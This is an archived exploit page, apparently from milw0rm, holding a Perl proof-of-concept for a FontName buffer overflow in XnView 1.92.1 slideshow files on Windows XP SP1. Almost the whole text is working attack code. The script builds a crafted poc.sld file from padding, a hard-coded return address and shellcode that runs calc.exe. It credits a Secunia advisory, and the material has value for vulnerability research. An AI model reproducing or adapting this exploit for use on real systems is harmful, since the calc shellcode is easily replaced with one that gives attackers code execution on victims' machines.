<html><head><title>XnView 1.92.1 Slideshow (FontName) Buffer Overflow Exploit</title></head><pre>#!/usr/bin/perl

# ================================================================
# XnView 1.92.1 Slideshow &quot;FontName&quot; Buffer Overflow
# ================================================================
#
# Calc execution POC Exploit for WinXP SP1 pro English
#
# Found by   : Stefan Cornelius, Secunia Research
# Advisory   : http://secunia.com/secunia_research/2008-6/advisory
#
# Exploit by : haluznik | haluznik&lt;at&gt;gmail.com
#
# 04.01.2008 ..April Fools Day ;)
# ================================================================


print &quot;\n [*] XnView 1.92.1 Slideshow exploit by haluznik\n\n&quot;;

my $head=
&quot;\x23\x20\x53\x6c\x69\x64\x65\x20\x53\x68&quot;.
&quot;\x6f\x77\x20\x53\x65\x71\x75\x65\x6e\x63&quot;.
&quot;\x65\x0d\x0a\x46\x6f\x6e\x74\x4e\x61\x6d&quot;.
&quot;\x65\x20\x3d\x20\x22&quot;;

$fontname = &quot;A&quot; x 32 . &quot;\xcc\x59\xfb\x77&quot;;

my $shellcode=
&quot;\x33\xc0\x50\x68\x63\x61\x6c\x63\x54\x5b&quot;.
&quot;\x50\x53\xb9\x44\x80\xc2\x77\xff\xd1\x50&quot;.
&quot;\xbb\xfd\x98\xe7\x77\xff\xd3&quot;;

my $tail=
&quot;\x22\x0d\x0a\x22\x43\x3a\x5c\x74\x65\x73&quot;.
&quot;\x74\x2e\x6a\x70\x67\x22\x0d\x0a&quot;;

$sld = $head . $fontname . $shellcode . $tail;

print &quot; [+] Creating poc.sld file..\n&quot;;

open(file,&quot;&gt;poc.sld&quot;) || die &quot; [-] cannot write file\n&quot;;
print(file $sld);
close(file);
print &quot; [*] Done!\n&quot;;

# milw0rm.com [2008-04-02]</pre></html>